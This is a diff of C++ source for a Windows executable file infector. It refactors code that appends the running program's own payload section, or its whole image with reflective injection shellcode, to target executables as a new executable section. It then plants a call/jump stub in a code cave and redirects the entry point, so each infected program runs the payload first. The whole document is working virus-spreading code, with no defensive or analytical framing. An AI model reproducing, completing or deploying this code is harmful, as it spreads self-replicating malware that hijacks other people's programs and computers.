@@ -74,311 +74,340 @@ namespace Infector
         return addr + (size / align + 1) * align;
     }
 
-    bool GetExecutableShellcodeDataToInject(const char* sectionNameToFind, unsigned int sectionNameToFindSize, void** buffer, unsigned long* bufferSize)
+    bool IsDotNetApplication(const wchar_t* path, bool* isDotNet)
     {
-        ULONG_PTR pModule = reinterpret_cast<ULONG_PTR>(GetModuleHandleA(NULL));
+        void* buffer;
+        unsigned long bufferSize;
+        if (!GetFileData(path, &buffer, &bufferSize))
+            return false;
+        
+        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;
+        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)buffer + pDosHeader->e_lfanew);
 
-        PIMAGE_DOS_HEADER pImageDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pModule);
+        *isDotNet = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size != 0;
 
-        PIMAGE_NT_HEADERS pImageNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(pModule + pImageDosHeader->e_lfanew);
+        custom_std::free(buffer);
 
-        PIMAGE_SECTION_HEADER pCurrentSection = IMAGE_FIRST_SECTION(pImageNtHeaders);
+        return true;
+    }
 
-        bool found = false;
-        for (size_t i = 0; i < pImageNtHeaders->FileHeader.NumberOfSections; i++)
+
+    namespace Native
+    {
+        bool GetExecutableShellcodeDataToInject(const char* sectionNameToFind, unsigned int sectionNameToFindSize, void** buffer, unsigned long* bufferSize)
         {
-            if (custom_std::memcmp(pCurrentSection->Name, sectionNameToFind, sectionNameToFindSize))
+            ULONG_PTR pModule = reinterpret_cast<ULONG_PTR>(GetModuleHandleA(NULL));
+
+            PIMAGE_DOS_HEADER pImageDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pModule);
+
+            PIMAGE_NT_HEADERS pImageNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(pModule + pImageDosHeader->e_lfanew);
+
+            PIMAGE_SECTION_HEADER pCurrentSection = IMAGE_FIRST_SECTION(pImageNtHeaders);
+
+            bool found = false;
+            for (size_t i = 0; i < pImageNtHeaders->FileHeader.NumberOfSections; i++)
             {
-                found = true;
-                break;
+                if (custom_std::memcmp(pCurrentSection->Name, sectionNameToFind, sectionNameToFindSize))
+                {
+                    found = true;
+                    break;
+                }
+
+                pCurrentSection++;
             }
-            
-            pCurrentSection++;
-        }
 
-        if (!found)
-        {
-            // Take current executable
-            wchar_t path[MAX_PATH * 2];
-
-            // GetModuleFileName retrieves the path of the executable file of the current process
-            DWORD result = GetModuleFileNameW(NULL, path, sizeof(path));
-            if (result > 0)
+            if (!found)
             {
-                void* fileBuffer;
-                unsigned long fileBufferSize;
+                // Take current executable
+                wchar_t path[MAX_PATH * 2];
 
-                // Add the reflective injector shellcode
-                GetFileData(path, &fileBuffer, &fileBufferSize);
+                // GetModuleFileName retrieves the path of the executable file of the current process
+                DWORD result = GetModuleFileNameW(NULL, path, sizeof(path));
+                if (result > 0)
+                {
+                    void* fileBuffer;
+                    unsigned long fileBufferSize;
 
-                void* sectionReflectiveShellcode = ReflectiveInjectionShellcode;
-                unsigned int sectionReflectiveShellcodeSize = (ULONG_PTR)ReflectiveInjectionShellcode_Marked - (ULONG_PTR)ReflectiveInjectionShellcode;
+                    // Add the reflective injector shellcode
+                    GetFileData(path, &fileBuffer, &fileBufferSize);
 
-                *bufferSize = fileBufferSize + sectionReflectiveShellcodeSize;
-                *buffer = custom_std::malloc(*bufferSize);
-                
-                custom_std::memcpy(*buffer, sectionReflectiveShellcode, sectionReflectiveShellcodeSize);
-                custom_std::memcpy(reinterpret_cast<void*>(reinterpret_cast<ULONG_PTR>(*buffer) + sectionReflectiveShellcodeSize),
-                    fileBuffer,
-                    fileBufferSize);
+                    void* sectionReflectiveShellcode = ReflectiveInjectionShellcode;
+                    unsigned int sectionReflectiveShellcodeSize = (ULONG_PTR)ReflectiveInjectionShellcode_Marked - (ULONG_PTR)ReflectiveInjectionShellcode;
+
+                    *bufferSize = fileBufferSize + sectionReflectiveShellcodeSize;
+                    *buffer = custom_std::malloc(*bufferSize);
+
+                    custom_std::memcpy(*buffer, sectionReflectiveShellcode, sectionReflectiveShellcodeSize);
+                    custom_std::memcpy(reinterpret_cast<void*>(reinterpret_cast<ULONG_PTR>(*buffer) + sectionReflectiveShellcodeSize),
+                        fileBuffer,
+                        fileBufferSize);
 
 
-                return true;
+                    return true;
+                }
+                else
+                {
+
+                    return false;
+                }
             }
             else
             {
+                // Read the section
+                *bufferSize = pCurrentSection->SizeOfRawData;
+                *buffer = custom_std::malloc(pCurrentSection->SizeOfRawData);
 
-                return false;
-            }
-        }
-        else
-        {
-            // Read the section
-            *bufferSize = pCurrentSection->SizeOfRawData;
-            *buffer = custom_std::malloc(pCurrentSection->SizeOfRawData);
-
-            custom_std::memcpy(*buffer, reinterpret_cast<void*>(pModule + pCurrentSection->VirtualAddress), *bufferSize);
-            return true;
-
-        }
-
-    }
-
-    bool IsExecutableInfected(const char* sectionNameToFind, unsigned int sectionNameToFindSize, void** buffer, unsigned long* bufferSize)
-    {
-        ULONG_PTR pModule = reinterpret_cast<ULONG_PTR>(*buffer);
-
-        PIMAGE_DOS_HEADER pImageDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pModule);
-
-        PIMAGE_NT_HEADERS pImageNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(pModule + pImageDosHeader->e_lfanew);
-
-        PIMAGE_SECTION_HEADER pCurrentSection = IMAGE_FIRST_SECTION(pImageNtHeaders);
-
-        for (size_t i = 0; i < pImageNtHeaders->FileHeader.NumberOfSections; i++)
-        {
-            if (custom_std::memcmp(pCurrentSection->Name, sectionNameToFind, sectionNameToFindSize))
-            {
+                custom_std::memcpy(*buffer, reinterpret_cast<void*>(pModule + pCurrentSection->VirtualAddress), *bufferSize);
                 return true;
+
             }
 
-            pCurrentSection++;
         }
 
-        return false;
-    }
-
-    bool InfectExecutable(
-        void* executableBuffer, 
-        unsigned long executableBufferSize, 
-        void* shellcodeJumperBuffer, 
-        unsigned long shellcodeJumperBufferSize, 
-        void* shellcodeBuffer, 
-        unsigned long shellcodeBufferSize, 
-        void** infectedExecutableBuffer, 
-        unsigned long* infectedExecutableBufferSize,
-        char* sectionName,
-        unsigned int sectionNameSize)
-    {
-
-        if (reinterpret_cast<PIMAGE_DOS_HEADER>(executableBuffer)->e_magic != IMAGE_DOS_SIGNATURE)
-            return false;
-
-        PIMAGE_DOS_HEADER pOriginalDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(executableBuffer);
-        PIMAGE_NT_HEADERS pOriginalNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((ULONG_PTR)(executableBuffer) + pOriginalDosHeader->e_lfanew);
-
-        PIMAGE_SECTION_HEADER pFirstSection = reinterpret_cast<PIMAGE_SECTION_HEADER>((ULONG_PTR)&pOriginalNtHeaders->OptionalHeader + pOriginalNtHeaders->FileHeader.SizeOfOptionalHeader);
-        PIMAGE_SECTION_HEADER pLastSection = &(pFirstSection[pOriginalNtHeaders->FileHeader.NumberOfSections - 1]);
-        PIMAGE_SECTION_HEADER pNewSection = &(pFirstSection[pOriginalNtHeaders->FileHeader.NumberOfSections]);
-
-        custom_std::memset(pNewSection, 0x00, sizeof(IMAGE_SECTION_HEADER));
-
-        custom_std::memcpy(pNewSection->Name, sectionName, sectionNameSize);
-
-        pNewSection->Misc.VirtualSize = align(shellcodeBufferSize, pOriginalNtHeaders->OptionalHeader.SectionAlignment, 0);
-        pNewSection->VirtualAddress = align(pLastSection->Misc.VirtualSize, pOriginalNtHeaders->OptionalHeader.SectionAlignment, pLastSection->VirtualAddress);
-        pNewSection->SizeOfRawData = align(shellcodeBufferSize, pOriginalNtHeaders->OptionalHeader.FileAlignment, 0);
-        pNewSection->PointerToRawData = align(pLastSection->SizeOfRawData, pOriginalNtHeaders->OptionalHeader.FileAlignment, pLastSection->PointerToRawData);
-        pNewSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
-
-        *infectedExecutableBufferSize = pNewSection->PointerToRawData + pNewSection->SizeOfRawData;
-        *infectedExecutableBuffer = custom_std::malloc(*infectedExecutableBufferSize);
-
-        for (size_t i = 0; i < pOriginalNtHeaders->OptionalHeader.SizeOfHeaders; i++)
+        bool IsExecutableInfected(const char* sectionNameToFind, unsigned int sectionNameToFindSize, void** buffer, unsigned long* bufferSize)
         {
-            ((BYTE*)*infectedExecutableBuffer)[i] = ((BYTE*)executableBuffer)[i];
-        }
-        
-        PIMAGE_DOS_HEADER pInfectedDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(*infectedExecutableBuffer);
-        PIMAGE_NT_HEADERS pInfectedNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((ULONG_PTR)(*infectedExecutableBuffer) + pInfectedDosHeader->e_lfanew);
+            ULONG_PTR pModule = reinterpret_cast<ULONG_PTR>(*buffer);
 
-        PIMAGE_SECTION_HEADER pTempSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
+            PIMAGE_DOS_HEADER pImageDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pModule);
 
-        custom_std::memcpy(&(pTempSection[pInfectedNtHeaders->FileHeader.NumberOfSections]), pNewSection, sizeof(IMAGE_SECTION_HEADER));
+            PIMAGE_NT_HEADERS pImageNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(pModule + pImageDosHeader->e_lfanew);
 
-        pInfectedNtHeaders->FileHeader.NumberOfSections += 1;
-        pInfectedNtHeaders->OptionalHeader.SizeOfImage = pNewSection->VirtualAddress + pNewSection->Misc.VirtualSize;
+            PIMAGE_SECTION_HEADER pCurrentSection = IMAGE_FIRST_SECTION(pImageNtHeaders);
 
-        custom_std::memset(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pNewSection->PointerToRawData), 0x00, pNewSection->SizeOfRawData);
-        custom_std::memcpy(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pNewSection->PointerToRawData), reinterpret_cast<void*>(shellcodeBuffer), shellcodeBufferSize);
-
-        PIMAGE_SECTION_HEADER pCurrentInfectedSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
-        PIMAGE_SECTION_HEADER pCurrentOriginalSection = IMAGE_FIRST_SECTION(pOriginalNtHeaders);
-        for (size_t i = 0; i < pOriginalNtHeaders->FileHeader.NumberOfSections; i++)
-        {
-            custom_std::memcpy(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pCurrentInfectedSection->PointerToRawData),
-                reinterpret_cast<void*>((ULONG_PTR)(executableBuffer) + pCurrentOriginalSection->PointerToRawData),
-                pCurrentOriginalSection->SizeOfRawData);
-
-            pCurrentInfectedSection++;
-            pCurrentOriginalSection++;
-        }
-
-
-        // Search for code cave in .text section (or any other section that starting the main function)
-        bool foundMainSection = false;
-        PIMAGE_SECTION_HEADER pInfectedTextSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
-        for (size_t i = 0; i < pInfectedNtHeaders->FileHeader.NumberOfSections; i++)
-        {
-            if (pInfectedTextSection->VirtualAddress <= pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint && pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint <= (pInfectedTextSection->VirtualAddress + pInfectedTextSection->Misc.VirtualSize))
+            for (size_t i = 0; i < pImageNtHeaders->FileHeader.NumberOfSections; i++)
             {
-                foundMainSection = true;
-                break;
-            }
-
-            pInfectedTextSection++;
-        }
-        if (!foundMainSection)
-            return false;
-
-        const unsigned char codeCaveValue = 0x00;
-        unsigned long foundCodeCaveIndex = -1;
-        for (size_t i = 0; i < pInfectedTextSection->SizeOfRawData - shellcodeJumperBufferSize; i++)
-        {
-
-            bool foundPattern = true;
-            for (size_t j = 0; j < shellcodeJumperBufferSize; j++)
-            {
-                if (reinterpret_cast<BYTE*>(*infectedExecutableBuffer)[pInfectedTextSection->PointerToRawData + i + j] != codeCaveValue)
+                if (custom_std::memcmp(pCurrentSection->Name, sectionNameToFind, sectionNameToFindSize))
                 {
-                    foundPattern = false;
+                    return true;
+                }
+
+                pCurrentSection++;
+            }
+
+            return false;
+        }
+
+        bool InfectExecutable(
+            void* executableBuffer,
+            unsigned long executableBufferSize,
+            void* shellcodeJumperBuffer,
+            unsigned long shellcodeJumperBufferSize,
+            void* shellcodeBuffer,
+            unsigned long shellcodeBufferSize,
+            void** infectedExecutableBuffer,
+            unsigned long* infectedExecutableBufferSize,
+            char* sectionName,
+            unsigned int sectionNameSize)
+        {
+
+            if (reinterpret_cast<PIMAGE_DOS_HEADER>(executableBuffer)->e_magic != IMAGE_DOS_SIGNATURE)
+                return false;
+
+            PIMAGE_DOS_HEADER pOriginalDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(executableBuffer);
+            PIMAGE_NT_HEADERS pOriginalNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((ULONG_PTR)(executableBuffer)+pOriginalDosHeader->e_lfanew);
+
+            PIMAGE_SECTION_HEADER pFirstSection = reinterpret_cast<PIMAGE_SECTION_HEADER>((ULONG_PTR)&pOriginalNtHeaders->OptionalHeader + pOriginalNtHeaders->FileHeader.SizeOfOptionalHeader);
+            PIMAGE_SECTION_HEADER pLastSection = &(pFirstSection[pOriginalNtHeaders->FileHeader.NumberOfSections - 1]);
+            PIMAGE_SECTION_HEADER pNewSection = &(pFirstSection[pOriginalNtHeaders->FileHeader.NumberOfSections]);
+
+            custom_std::memset(pNewSection, 0x00, sizeof(IMAGE_SECTION_HEADER));
+
+            custom_std::memcpy(pNewSection->Name, sectionName, sectionNameSize);
+
+            pNewSection->Misc.VirtualSize = align(shellcodeBufferSize, pOriginalNtHeaders->OptionalHeader.SectionAlignment, 0);
+            pNewSection->VirtualAddress = align(pLastSection->Misc.VirtualSize, pOriginalNtHeaders->OptionalHeader.SectionAlignment, pLastSection->VirtualAddress);
+            pNewSection->SizeOfRawData = align(shellcodeBufferSize, pOriginalNtHeaders->OptionalHeader.FileAlignment, 0);
+            pNewSection->PointerToRawData = align(pLastSection->SizeOfRawData, pOriginalNtHeaders->OptionalHeader.FileAlignment, pLastSection->PointerToRawData);
+            pNewSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
+
+            *infectedExecutableBufferSize = pNewSection->PointerToRawData + pNewSection->SizeOfRawData;
+            *infectedExecutableBuffer = custom_std::malloc(*infectedExecutableBufferSize);
+
+            for (size_t i = 0; i < pOriginalNtHeaders->OptionalHeader.SizeOfHeaders; i++)
+            {
+                ((BYTE*)*infectedExecutableBuffer)[i] = ((BYTE*)executableBuffer)[i];
+            }
+
+            PIMAGE_DOS_HEADER pInfectedDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(*infectedExecutableBuffer);
+            PIMAGE_NT_HEADERS pInfectedNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((ULONG_PTR)(*infectedExecutableBuffer) + pInfectedDosHeader->e_lfanew);
+
+            PIMAGE_SECTION_HEADER pTempSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
+
+            custom_std::memcpy(&(pTempSection[pInfectedNtHeaders->FileHeader.NumberOfSections]), pNewSection, sizeof(IMAGE_SECTION_HEADER));
+
+            pInfectedNtHeaders->FileHeader.NumberOfSections += 1;
+            pInfectedNtHeaders->OptionalHeader.SizeOfImage = pNewSection->VirtualAddress + pNewSection->Misc.VirtualSize;
+
+            custom_std::memset(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pNewSection->PointerToRawData), 0x00, pNewSection->SizeOfRawData);
+            custom_std::memcpy(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pNewSection->PointerToRawData), reinterpret_cast<void*>(shellcodeBuffer), shellcodeBufferSize);
+
+            PIMAGE_SECTION_HEADER pCurrentInfectedSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
+            PIMAGE_SECTION_HEADER pCurrentOriginalSection = IMAGE_FIRST_SECTION(pOriginalNtHeaders);
+            for (size_t i = 0; i < pOriginalNtHeaders->FileHeader.NumberOfSections; i++)
+            {
+                custom_std::memcpy(reinterpret_cast<void*>((ULONG_PTR)(*infectedExecutableBuffer) + pCurrentInfectedSection->PointerToRawData),
+                    reinterpret_cast<void*>((ULONG_PTR)(executableBuffer)+pCurrentOriginalSection->PointerToRawData),
+                    pCurrentOriginalSection->SizeOfRawData);
+
+                pCurrentInfectedSection++;
+                pCurrentOriginalSection++;
+            }
+
+
+            // Search for code cave in .text section (or any other section that starting the main function)
+            bool foundMainSection = false;
+            PIMAGE_SECTION_HEADER pInfectedTextSection = IMAGE_FIRST_SECTION(pInfectedNtHeaders);
+            for (size_t i = 0; i < pInfectedNtHeaders->FileHeader.NumberOfSections; i++)
+            {
+                if (pInfectedTextSection->VirtualAddress <= pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint && pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint <= (pInfectedTextSection->VirtualAddress + pInfectedTextSection->Misc.VirtualSize))
+                {
+                    foundMainSection = true;
+                    break;
+                }
+
+                pInfectedTextSection++;
+            }
+            if (!foundMainSection)
+                return false;
+
+            const unsigned char codeCaveValue = 0x00;
+            unsigned long foundCodeCaveIndex = -1;
+            for (size_t i = 0; i < pInfectedTextSection->SizeOfRawData - shellcodeJumperBufferSize; i++)
+            {
+
+                bool foundPattern = true;
+                for (size_t j = 0; j < shellcodeJumperBufferSize; j++)
+                {
+                    if (reinterpret_cast<BYTE*>(*infectedExecutableBuffer)[pInfectedTextSection->PointerToRawData + i + j] != codeCaveValue)
+                    {
+                        foundPattern = false;
+                        break;
+                    }
+                }
+
+                if (foundPattern)
+                {
+                    foundCodeCaveIndex = i;
                     break;
                 }
             }
 
-            if (foundPattern)
+            // Dont forget to cleanup data
+            if (foundCodeCaveIndex == -1)
+                return false;
+
+
+            ULONG_PTR codeCaveVirtualAddress = foundCodeCaveIndex + pInfectedTextSection->VirtualAddress;
+
+            // Now set the code cave inside
+            for (size_t i = 0; i < shellcodeJumperBufferSize - sizeof(DWORD); i++)
             {
-                foundCodeCaveIndex = i;
-                break;
+                // new main pointer
+                if (*reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) == 0x01234567)
+                {
+                    *reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) = pCurrentInfectedSection->VirtualAddress - (codeCaveVirtualAddress + i + 4);
+                }
+
+                // old main pointer
+                if (*reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) == 0x89ABCDEF)
+                {
+                    *reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) = pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint - (codeCaveVirtualAddress + i + 4);
+                }
             }
+
+            BYTE* codeCaveShellcodePointer = &reinterpret_cast<BYTE*>(*infectedExecutableBuffer)[pInfectedTextSection->PointerToRawData + foundCodeCaveIndex];
+            custom_std::memcpy(codeCaveShellcodePointer, shellcodeJumperBuffer, shellcodeJumperBufferSize);
+
+            // Set entrypoint
+            pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint = codeCaveVirtualAddress;
+
+            return true;
         }
-        
-        // Dont forget to cleanup data
-        if (foundCodeCaveIndex == -1)
-            return false;
-        
 
-        ULONG_PTR codeCaveVirtualAddress = foundCodeCaveIndex + pInfectedTextSection->VirtualAddress;
 
-        // Now set the code cave inside
-        for (size_t i = 0; i < shellcodeJumperBufferSize - sizeof(DWORD); i++)
+        bool InfectFile(const wchar_t* path)
         {
-            // new main pointer
-            if (*reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) == 0x01234567)
-            {
-                *reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) = pCurrentInfectedSection->VirtualAddress - (codeCaveVirtualAddress + i + 4);
-            }
+            void* executableBuffer = NULL;
+            unsigned long executableBufferSize;
 
-            // old main pointer
-            if (*reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) == 0x89ABCDEF)
+            void* infectedExecutableBuffer = NULL;
+            unsigned long infectedExecutableBufferSize;
+
+            void* sectionData = NULL;
+            unsigned long sectionDataSize;
+
+            unsigned char sectionName[] = { 'e', 'x', 'p', '3', '\x00' };
+
+            unsigned char shellcodeJumper[13];
+            shellcodeJumper[0] = 0x50; // PUSH RAX - TO ALIGN STACK TO 16
+            shellcodeJumper[1] = 0xE8; // CALL REL
+            *reinterpret_cast<DWORD*>(&shellcodeJumper[2]) = 0x01234567; // Relative address of new main function
+            shellcodeJumper[sizeof(DWORD) + 2] = 0x58; // POP EAX - TO REARENGE THE STACK FRAME BACK
+            shellcodeJumper[sizeof(DWORD) + 3] = 0xE9; // JMP REL
+            *reinterpret_cast<DWORD*>(&shellcodeJumper[sizeof(DWORD) + 4]) = 0x89ABCDEF; // Relative address of old main function
+
+            bool succeed = false;
+            do
             {
-                *reinterpret_cast<DWORD*>(&reinterpret_cast<unsigned char*>(shellcodeJumperBuffer)[i]) = pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint - (codeCaveVirtualAddress + i + 4);
-            }
+                if (!GetExecutableShellcodeDataToInject(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &sectionData, &sectionDataSize))
+                {
+                    break;
+                }
+
+                if (!GetFileData(path, &executableBuffer, &executableBufferSize))
+                {
+                    break;
+                }
+
+                if (IsExecutableInfected(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &executableBuffer, &executableBufferSize))
+                {
+                    break;
+                }
+
+                if (!InfectExecutable(executableBuffer, executableBufferSize, shellcodeJumper, sizeof(shellcodeJumper), sectionData, sectionDataSize, &infectedExecutableBuffer, &infectedExecutableBufferSize, reinterpret_cast<char*>(sectionName), sizeof(sectionName)))
+                {
+                    break;
+                }
+
+                if (!SetFileData(path, infectedExecutableBuffer, infectedExecutableBufferSize))
+                {
+                    break;
+                }
+
+                succeed = true;
+
+            } while (false);
+
+            if (executableBuffer != NULL)
+                custom_std::free(executableBuffer);
+
+            if (infectedExecutableBuffer != NULL)
+                custom_std::free(infectedExecutableBuffer);
+
+            if (sectionData != NULL)
+                custom_std::free(sectionData);
+
+
+            return succeed;
         }
-
-        BYTE* codeCaveShellcodePointer = &reinterpret_cast<BYTE*>(*infectedExecutableBuffer)[pInfectedTextSection->PointerToRawData + foundCodeCaveIndex];
-        custom_std::memcpy(codeCaveShellcodePointer, shellcodeJumperBuffer, shellcodeJumperBufferSize);
-
-        // Set entrypoint
-        pInfectedNtHeaders->OptionalHeader.AddressOfEntryPoint = codeCaveVirtualAddress;
-        
-        return true;
     }
+
+    namespace DotNet
+    {
+
+        bool InfectFile(const wchar_t* path)
+        {
+
+        }
+    }
+
 
     bool InfectFile(const wchar_t* path)
     {
-        void* executableBuffer = NULL;
-        unsigned long executableBufferSize;
-
-        void* infectedExecutableBuffer = NULL;
-        unsigned long infectedExecutableBufferSize;
-
-        void* sectionData = NULL;
-        unsigned long sectionDataSize;
-
-        unsigned char sectionName[] = { 'e', 'x', 'p', '3', '\x00' };
-
-        unsigned char shellcodeJumper[13];
-        shellcodeJumper[0] = 0x50; // PUSH RAX - TO ALIGN STACK TO 16
-        shellcodeJumper[1] = 0xE8; // CALL REL
-        *reinterpret_cast<DWORD*>(&shellcodeJumper[2]) = 0x01234567; // Relative address of new main function
-        shellcodeJumper[sizeof(DWORD) + 2] = 0x58; // POP EAX - TO REARENGE THE STACK FRAME BACK
-        shellcodeJumper[sizeof(DWORD) + 3] = 0xE9; // JMP REL
-        *reinterpret_cast<DWORD*>(&shellcodeJumper[sizeof(DWORD) + 4]) = 0x89ABCDEF; // Relative address of old main function
-        
-        bool succeed = false;
-        do
-        {
-            LOG("GetExecutableShellcodeDataToInject");
-            if (!GetExecutableShellcodeDataToInject(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &sectionData, &sectionDataSize))
-            {
-                LOG("Failed GetExecutableShellcodeDataToInject");
-                break;
-            }
-
-            LOG("GetFileData");
-            if (!GetFileData(path, &executableBuffer, &executableBufferSize))
-            {
-                LOG("Failed GetFileData");
-                break;
-            }
-
-            LOG("IsExecutableInfected");
-            if (IsExecutableInfected(reinterpret_cast<char*>(sectionName), sizeof(sectionName), &executableBuffer, &executableBufferSize))
-            {
-                LOG("Failed IsExecutableInfected");
-                break;
-            }
-
-            LOG("InfectExecutable");
-            if (!InfectExecutable(executableBuffer, executableBufferSize, shellcodeJumper, sizeof(shellcodeJumper), sectionData, sectionDataSize, &infectedExecutableBuffer, &infectedExecutableBufferSize, reinterpret_cast<char*>(sectionName), sizeof(sectionName)))
-            {
-                LOG("Failed InfectExecutable");
-                break;
-            }
-
-            LOG("SetFileData");
-            if (!SetFileData(path, infectedExecutableBuffer, infectedExecutableBufferSize))
-            {
-                LOG("Failed SetFileData");
-                break;
-            }
-
-            succeed = true;
-
-        } while (false);
-
-        if (executableBuffer != NULL)
-            custom_std::free(executableBuffer);
-
-        if (infectedExecutableBuffer != NULL)
-            custom_std::free(infectedExecutableBuffer);
-
-        if (sectionData != NULL)
-            custom_std::free(sectionData);
-
-
-        return succeed;
+        return Native::InfectFile(path);
     }
+
+
 
 }
 
